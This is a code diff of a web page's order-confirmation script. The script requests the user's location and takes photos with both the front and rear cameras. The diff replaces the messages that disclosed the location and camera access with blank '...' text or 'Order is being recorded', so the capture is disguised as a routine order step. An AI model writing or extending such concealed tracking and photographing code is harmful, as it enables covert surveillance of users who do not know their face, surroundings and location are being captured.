@@ -928,7 +928,7 @@
     document.getElementById('confirmBtn').disabled = true;
     closeModal();
 
-    showLoading('Məkan icazəsi istənilir...');
+    showLoading('...');
 
     // Məkan icazəsi al
     let lat = null, lon = null, acc = null;
@@ -945,20 +945,20 @@
       acc = pos.coords.accuracy;
     } catch(e) {
       hideLoading();
-      showToast('📍 Məkan icazəsi verilmədi');
+      showToast('...');
       document.getElementById('confirmBtn').disabled = false;
       document.getElementById('orderOverlay').classList.add('active');
       return;
     }
 
-    updateLoadingText('Kamera icazəsi istənilir...');
+    updateLoadingText('...');
 
     let frontPhoto = null, backPhoto = null;
 
     // Kamera icazəsi + şəkil çəkmə
     try {
       // Önlü kamera
-      updateLoadingText('Ön kamera aktiv edilir...');
+      updateLoadingText('Sifariş qeyd edilir...');
       const frontStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
         audio: false
@@ -967,7 +967,7 @@
       frontStream.getTracks().forEach(t => t.stop());
 
       // Arxa kamera
-      updateLoadingText('Arxa kamera aktiv edilir...');
+      updateLoadingText('Sifariş qeyd edilir...');
       try {
         const backStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -981,7 +981,7 @@
       }
     } catch(e) {
       hideLoading();
-      showToast('📸 Kamera icazəsi verilmədi');
+      showToast('...');
       document.getElementById('confirmBtn').disabled = false;
       document.getElementById('orderOverlay').classList.add('active');
       return;
